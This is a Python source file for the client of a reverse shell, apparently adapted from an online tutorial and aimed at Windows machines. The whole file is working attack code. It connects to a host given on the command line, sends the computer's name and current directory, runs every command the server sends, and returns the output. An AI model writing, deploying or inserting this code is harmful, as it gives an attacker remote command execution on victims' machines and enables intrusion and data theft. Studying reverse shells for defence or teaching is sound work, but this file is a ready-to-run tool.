import socket
import os
import subprocess
import sys
# https://www.thepythoncode.com/article/create-reverse-shell-python#:~:text=How%20to%20Create%20a%20Reverse%20Shell%20in%20Python,are%20some%20ideas%20to%20extend%20that%20code%3A%20


def get_id():
    return os.environ['COMPUTERNAME']  # TODO ?find better id?


SERVER_HOST = sys.argv[1]
SERVER_PORT = 2424
BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, feel free to increase
SEPARATOR = '<sep>'  # separator string for sending 2 messages in one go

# create the socket object
sock = socket.socket()

# connect to the server
sock.connect((SERVER_HOST, SERVER_PORT))

# get the current directory
current_dir = os.getcwd()
# get the Unique User Identifier
pc_id = get_id()

message = f'{current_dir}{SEPARATOR}{pc_id}'
sock.send(message.encode(encoding='utf-8'))
while True:
    # receive the command from the server
    command = sock.recv(BUFFER_SIZE).decode().strip()
    if not command:
        continue

    if command.lower() == 'exit':
        break  # if the command is exit, just break out of the loop
    
    if command[:2] == 'cd':  # cd command, change directory (str[start:end:step])
        try:
            # remove cd and remove leading space 
            command = command[2:].strip()  # removing ending at the same time because why not

            if len(command) < 3:
                command += 'c:\\'[len(command):]  # c: --> c:\ and c --> c:\                    at least I hope
            
            os.chdir(command)

        except FileNotFoundError as err:
            output = str(err)  # if there is an error, set as the output
        
        else:
            output = ''  # if operation is successful, empty message
    else:
        # execute the command and retrieve the results
        output = subprocess.getoutput(command)

    # get the current working directory as output
    current_dir = os.getcwd()
    # get the Unique User Identifier
    pc_id = get_id()

    # send the results back to the server
    message = f'{output}{SEPARATOR}{current_dir}{SEPARATOR}{pc_id}'
    sock.send(message.encode(encoding='utf-8'))

sock.close()  # close client connection
